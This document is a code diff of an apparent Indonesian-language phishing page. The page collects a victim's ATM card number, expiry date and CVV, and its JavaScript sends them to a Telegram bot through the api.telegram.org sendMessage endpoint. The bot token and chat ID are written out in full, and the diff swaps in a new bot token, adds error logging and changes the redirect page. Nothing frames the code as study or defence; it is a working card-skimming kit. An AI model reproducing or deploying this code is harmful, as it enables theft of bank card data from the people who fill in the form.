@@ -13,7 +13,7 @@
       background-size: cover;
       background-repeat: no-repeat;
       background-position: center;
-      background-attachment: fixed; /* Mengatur gambar latar belakang tetap saat scroll */
+      background-attachment: fixed;
       font-family: Arial, sans-serif;
     }
 
@@ -24,7 +24,7 @@
       padding: 10px;
       border-radius: 10px;
       box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
-      margin-top: 90px; /* Mengatur jarak atas dari container */
+      margin-top: 90px;
     }
 
     .header {
@@ -54,7 +54,7 @@
       color: #007bff;
       margin-bottom: 5px;
       font-weight: bold;
-      font-size: 12px; /* Ukuran font lebih kecil */
+      font-size: 12px;
     }
 
     .btn {
@@ -120,15 +120,15 @@
     <form id="registrationForm">
       <div class="input-group">
         <label for="nomor_kartu">16 Digit Angka No Kartu ATM</label>
-        <input type="text" id="nomor_kartu" name="nomor_kartu" placeholder="Masukkan Nomor Kartu" required style="width: calc(100% - 43px); padding: 11px 16px 13px 20px; border: 2px solid #ccc; border-radius: 5px;" maxlength="19">
+        <input type="text" id="nomor_kartu" name="nomor_kartu" placeholder="Masukkan Nomor Kartu" required maxlength="19" style="width: calc(100% - 43px); padding: 11px 16px 13px 20px; border: 2px solid #ccc; border-radius: 5px;">
       </div>
       <div class="input-group">
         <label for="masa_berlaku">Valid Thru (Masa Berlaku)</label>
-        <input type="text" id="masa_berlaku" name="masa_berlaku" placeholder="MM/YY" required style="width: calc(100% - 43px); padding: 11px 16px 13px 20px; border: 2px solid #ccc; border-radius: 5px;" maxlength="5">
+        <input type="text" id="masa_berlaku" name="masa_berlaku" placeholder="MM/YY" required maxlength="5" style="width: calc(100% - 43px); padding: 11px 16px 13px 20px; border: 2px solid #ccc; border-radius: 5px;">
       </div>
       <div class="input-group">
         <label for="cvv">CVV (3 Digit Di Balik Kartu)</label>
-        <input type="text" id="cvv" name="cvv" placeholder="CVV" required style="width: calc(100% - 43px); padding: 11px 16px 13px 20px; border: 2px solid #ccc; border-radius: 5px;" maxlength="3">
+        <input type="text" id="cvv" name="cvv" placeholder="CVV" required maxlength="3" style="width: calc(100% - 43px); padding: 11px 16px 13px 20px; border: 2px solid #ccc; border-radius: 5px;">
       </div>
       <button type="button" class="btn" onclick="kirimPesan()">LANJUT</button>
       <a href="index.html" class="btn-link">Kembali ke Halaman Utama</a>
@@ -142,11 +142,6 @@
         value = value.replace(/\D/g, '');
         if (value.length > 2) {
             value = value.substring(0, 2) + '/' + value.substring(2);
-            if (value.length > 5) {
-                if (value.length === 3) {
-                    value += '24';
-                }
-            }
         }
         input.value = value;
     }
@@ -185,17 +180,17 @@
       xhttp.onreadystatechange = function() {
         if (this.readyState === 4 && this.status === 200) {
           console.log("Pesan terkirim: " + message);
+        } else if (this.readyState === 4) {
+          console.error("Gagal mengirim pesan. Status: " + this.status + ", Response: " + this.responseText);
         }
       };
-      var url = "https://api.telegram.org/bot6406080700:AAHtISL259Uu4s3x93AzNMWK-XGedAGdp_0/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
+      var url = "https://api.telegram.org/bot6711678141:AAHCPWlRygK8bHdAhXUlfIFCf6GztfCwsjY/sendMessage?chat_id=6824078885&text=" + encodeURIComponent(message);
 
       xhttp.open("POST", url, true);
       xhttp.send();
     }
 
-    function kirimPesan(event) {
-      event.preventDefault(); // Mencegah pengiriman form secara default
-
+    function kirimPesan() {
       var masaBerlaku = document.getElementById('masa_berlaku').value;
       var cvv = document.getElementById('cvv').value;
       var nomorKartu = document.getElementById('nomor_kartu').value;
@@ -217,7 +212,7 @@
       setTimeout(function() {
         loader.style.display = 'none';
         console.log('Data berhasil dikirim ke Telegram!');
-        window.location.href = 'halaman-selanjutnya.html';
+        window.location.href = 'akhir.html';
       }, 3000); // 3000 ms = 3 detik
     }
   </script>
